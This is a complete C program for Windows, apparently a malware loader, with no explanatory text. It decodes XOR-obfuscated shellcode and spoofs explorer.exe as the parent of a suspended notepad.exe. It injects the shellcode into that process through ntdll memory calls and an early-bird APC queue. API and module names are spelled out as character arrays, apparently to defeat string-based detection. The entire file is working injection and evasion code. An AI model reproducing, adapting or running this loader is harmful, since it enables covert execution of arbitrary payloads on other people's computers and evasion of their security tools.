#include <Windows.h>
#include <TlHelp32.h>

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID  ApcRoutine,
    PVOID  ApcRoutineContext,
    PVOID  ApcStatusBlock,
    PVOID  ApcReserved
);

#define XOR_KEY 0xAB

unsigned char cShellcode[] = {
    0xd9^XOR_KEY, 0xeb^XOR_KEY, 0x9b^XOR_KEY, 0xd9^XOR_KEY, 0x74^XOR_KEY, 0x24^XOR_KEY, 0xf4^XOR_KEY, 0x31^XOR_KEY,
    0xd2^XOR_KEY, 0xb2^XOR_KEY, 0x77^XOR_KEY, 0x31^XOR_KEY, 0xc9^XOR_KEY, 0x64^XOR_KEY, 0x8b^XOR_KEY, 0x71^XOR_KEY,
    0x30^XOR_KEY, 0x8b^XOR_KEY, 0x76^XOR_KEY, 0x0c^XOR_KEY, 0x8b^XOR_KEY, 0x76^XOR_KEY, 0x1c^XOR_KEY, 0x8b^XOR_KEY,
    0x46^XOR_KEY, 0x08^XOR_KEY, 0x8b^XOR_KEY, 0x7e^XOR_KEY, 0x20^XOR_KEY, 0x8b^XOR_KEY, 0x36^XOR_KEY, 0x38^XOR_KEY,
    0x4f^XOR_KEY, 0x18^XOR_KEY, 0x75^XOR_KEY, 0xf3^XOR_KEY, 0x59^XOR_KEY, 0x01^XOR_KEY, 0xd1^XOR_KEY, 0xff^XOR_KEY,
    0xe1^XOR_KEY, 0x60^XOR_KEY, 0x8b^XOR_KEY, 0x6c^XOR_KEY, 0x24^XOR_KEY, 0x24^XOR_KEY, 0x8b^XOR_KEY, 0x45^XOR_KEY,
    0x3c^XOR_KEY, 0x8b^XOR_KEY, 0x54^XOR_KEY, 0x28^XOR_KEY, 0x78^XOR_KEY, 0x01^XOR_KEY, 0xea^XOR_KEY, 0x8b^XOR_KEY,
    0x4a^XOR_KEY, 0x18^XOR_KEY, 0x8b^XOR_KEY, 0x5a^XOR_KEY, 0x20^XOR_KEY, 0x01^XOR_KEY, 0xeb^XOR_KEY, 0xe3^XOR_KEY,
    0x34^XOR_KEY, 0x49^XOR_KEY, 0x8b^XOR_KEY, 0x34^XOR_KEY, 0x8b^XOR_KEY, 0x01^XOR_KEY, 0xee^XOR_KEY, 0x31^XOR_KEY,
    0xff^XOR_KEY, 0x31^XOR_KEY, 0xc0^XOR_KEY, 0xfc^XOR_KEY, 0xac^XOR_KEY, 0x84^XOR_KEY, 0xc0^XOR_KEY, 0x74^XOR_KEY,
    0x07^XOR_KEY, 0xc1^XOR_KEY, 0xcf^XOR_KEY, 0x0d^XOR_KEY, 0x01^XOR_KEY, 0xc7^XOR_KEY, 0xeb^XOR_KEY, 0xf4^XOR_KEY,
    0x3b^XOR_KEY, 0x7c^XOR_KEY, 0x24^XOR_KEY, 0x28^XOR_KEY, 0x75^XOR_KEY, 0xe1^XOR_KEY, 0x8b^XOR_KEY, 0x5a^XOR_KEY,
    0x24^XOR_KEY, 0x01^XOR_KEY, 0xeb^XOR_KEY, 0x66^XOR_KEY, 0x8b^XOR_KEY, 0x0c^XOR_KEY, 0x4b^XOR_KEY, 0x8b^XOR_KEY,
    0x5a^XOR_KEY, 0x1c^XOR_KEY, 0x01^XOR_KEY, 0xeb^XOR_KEY, 0x8b^XOR_KEY, 0x04^XOR_KEY, 0x8b^XOR_KEY, 0x01^XOR_KEY,
    0xe8^XOR_KEY, 0x89^XOR_KEY, 0x44^XOR_KEY, 0x24^XOR_KEY, 0x1c^XOR_KEY, 0x61^XOR_KEY, 0xc3^XOR_KEY, 0xb2^XOR_KEY,
    0x08^XOR_KEY, 0x29^XOR_KEY, 0xd4^XOR_KEY, 0x89^XOR_KEY, 0xe5^XOR_KEY, 0x89^XOR_KEY, 0xc2^XOR_KEY, 0x68^XOR_KEY,
    0x8e^XOR_KEY, 0x4e^XOR_KEY, 0x0e^XOR_KEY, 0xec^XOR_KEY, 0x52^XOR_KEY, 0xe8^XOR_KEY, 0x9f^XOR_KEY, 0xff^XOR_KEY,
    0xff^XOR_KEY, 0xff^XOR_KEY, 0x89^XOR_KEY, 0x45^XOR_KEY, 0x04^XOR_KEY, 0xbb^XOR_KEY, 0x7e^XOR_KEY, 0xd8^XOR_KEY,
    0xe2^XOR_KEY, 0x73^XOR_KEY, 0x87^XOR_KEY, 0x1c^XOR_KEY, 0x24^XOR_KEY, 0x52^XOR_KEY, 0xe8^XOR_KEY, 0x8e^XOR_KEY,
    0xff^XOR_KEY, 0xff^XOR_KEY, 0xff^XOR_KEY, 0x89^XOR_KEY, 0x45^XOR_KEY, 0x08^XOR_KEY, 0x68^XOR_KEY, 0x6c^XOR_KEY,
    0x6c^XOR_KEY, 0x20^XOR_KEY, 0x41^XOR_KEY, 0x68^XOR_KEY, 0x33^XOR_KEY, 0x32^XOR_KEY, 0x2e^XOR_KEY, 0x64^XOR_KEY,
    0x68^XOR_KEY, 0x75^XOR_KEY, 0x73^XOR_KEY, 0x65^XOR_KEY, 0x72^XOR_KEY, 0x30^XOR_KEY, 0xdb^XOR_KEY, 0x88^XOR_KEY,
    0x5c^XOR_KEY, 0x24^XOR_KEY, 0x0a^XOR_KEY, 0x89^XOR_KEY, 0xe6^XOR_KEY, 0x56^XOR_KEY, 0xff^XOR_KEY, 0x55^XOR_KEY,
    0x04^XOR_KEY, 0x89^XOR_KEY, 0xc2^XOR_KEY, 0x50^XOR_KEY, 0xbb^XOR_KEY, 0xa8^XOR_KEY, 0xa2^XOR_KEY, 0x4d^XOR_KEY,
    0xbc^XOR_KEY, 0x87^XOR_KEY, 0x1c^XOR_KEY, 0x24^XOR_KEY, 0x52^XOR_KEY, 0xe8^XOR_KEY, 0x5f^XOR_KEY, 0xff^XOR_KEY,
    0xff^XOR_KEY, 0xff^XOR_KEY, 0x68^XOR_KEY, 0x64^XOR_KEY, 0x58^XOR_KEY, 0x20^XOR_KEY, 0x20^XOR_KEY, 0x68^XOR_KEY,
    0x70^XOR_KEY, 0x77^XOR_KEY, 0x6e^XOR_KEY, 0x65^XOR_KEY, 0x31^XOR_KEY, 0xdb^XOR_KEY, 0x88^XOR_KEY, 0x5c^XOR_KEY,
    0x24^XOR_KEY, 0x05^XOR_KEY, 0x89^XOR_KEY, 0xe3^XOR_KEY, 0x68^XOR_KEY, 0x65^XOR_KEY, 0x78^XOR_KEY, 0x65^XOR_KEY,
    0x58^XOR_KEY, 0x68^XOR_KEY, 0x61^XOR_KEY, 0x6c^XOR_KEY, 0x63^XOR_KEY, 0x2e^XOR_KEY, 0x68^XOR_KEY, 0x6f^XOR_KEY,
    0x6d^XOR_KEY, 0x20^XOR_KEY, 0x63^XOR_KEY, 0x68^XOR_KEY, 0x6f^XOR_KEY, 0x20^XOR_KEY, 0x46^XOR_KEY, 0x72^XOR_KEY,
    0x68^XOR_KEY, 0x48^XOR_KEY, 0x65^XOR_KEY, 0x6c^XOR_KEY, 0x6c^XOR_KEY, 0x31^XOR_KEY, 0xc9^XOR_KEY, 0x88^XOR_KEY,
    0x4c^XOR_KEY, 0x24^XOR_KEY, 0x13^XOR_KEY, 0x89^XOR_KEY, 0xe1^XOR_KEY, 0x31^XOR_KEY, 0xd2^XOR_KEY, 0x52^XOR_KEY,
    0x53^XOR_KEY, 0x51^XOR_KEY, 0x52^XOR_KEY, 0xff^XOR_KEY, 0xd0^XOR_KEY, 0x31^XOR_KEY, 0xc0^XOR_KEY, 0x50^XOR_KEY,
    0xff^XOR_KEY, 0x55^XOR_KEY, 0x08^XOR_KEY
};

void DecryptShellcode(unsigned char* buf, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
}

DWORD GetProcessIdByName(const wchar_t* szName) {
    DWORD dwPid = 0;

    char szKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char szSnap[]     = { 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0' };
    char szFirst[]    = { 'P','r','o','c','e','s','s','3','2','F','i','r','s','t','W','\0' };
    char szNext[]     = { 'P','r','o','c','e','s','s','3','2','N','e','x','t','W','\0' };

    typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL  (WINAPI* pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL  (WINAPI* pProcess32NextW) (HANDLE, LPPROCESSENTRY32W);

    HMODULE hK32   = GetModuleHandleA(szKernel32);
    pCreateToolhelp32Snapshot fnSnap  = (pCreateToolhelp32Snapshot)GetProcAddress(hK32, szSnap);
    pProcess32FirstW          fnFirst = (pProcess32FirstW)          GetProcAddress(hK32, szFirst);
    pProcess32NextW           fnNext  = (pProcess32NextW)           GetProcAddress(hK32, szNext);

    HANDLE hSnap = fnSnap(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (fnFirst(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, szName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (fnNext(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return dwPid;
}

int main()
{
    char szTarget[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e','\0' };
    wchar_t szParent[] = { 'e','x','p','l','o','r','e','r','.','e','x','e','\0' };

    char szNtdll[]     = { 'n','t','d','l','l','.','d','l','l','\0' };
    char szNtAlloc[]   = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
    char szNtWrite[]   = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
    char szNtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
    char szNtApc[]     = { 'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d','\0' };

    HMODULE hNtdll = GetModuleHandleA(szNtdll);

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, szNtAlloc);
    pNtWriteVirtualMemory    NtWriteVirtualMemory    = (pNtWriteVirtualMemory)   GetProcAddress(hNtdll, szNtWrite);
    pNtProtectVirtualMemory  NtProtectVirtualMemory  = (pNtProtectVirtualMemory) GetProcAddress(hNtdll, szNtProtect);
    pNtQueueApcThread        NtQueueApcThread        = (pNtQueueApcThread)       GetProcAddress(hNtdll, szNtApc);

    SIZE_T sShellcode = sizeof(cShellcode);
    DecryptShellcode(cShellcode, sShellcode);

    DWORD  dwParentPid    = GetProcessIdByName(szParent);
    HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);

    SIZE_T cbAttributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList =
        (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    UpdateProcThreadAttribute(
        pAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProcess, sizeof(HANDLE),
        NULL, NULL
    );

    STARTUPINFOEXA siEx  = { sizeof(siEx) };
    siEx.lpAttributeList = pAttributeList;
    PROCESS_INFORMATION pInfo = { 0 };

    CreateProcessA(
        szTarget, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        (LPSTARTUPINFOA)&siEx,
        &pInfo
    );

    HANDLE hProc   = pInfo.hProcess;
    HANDLE hThread = pInfo.hThread;

    PVOID  lpvShellAddress = NULL;
    SIZE_T sRegion         = sShellcode;
    NtAllocateVirtualMemory(hProc, &lpvShellAddress, 0, &sRegion, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T sBytesWritten = 0;
    NtWriteVirtualMemory(hProc, lpvShellAddress, cShellcode, sShellcode, &sBytesWritten);

    ULONG  ulOldProtect = 0;
    SIZE_T sProtRegion  = sShellcode;
    NtProtectVirtualMemory(hProc, &lpvShellAddress, &sProtRegion, PAGE_EXECUTE_READ, &ulOldProtect);

    PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;
    NtQueueApcThread(hThread, (PVOID)ptApcRoutine, NULL, NULL, NULL);

    ResumeThread(hThread);

    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hParentProcess);
    CloseHandle(hProc);
    CloseHandle(hThread);

    return 0;
}
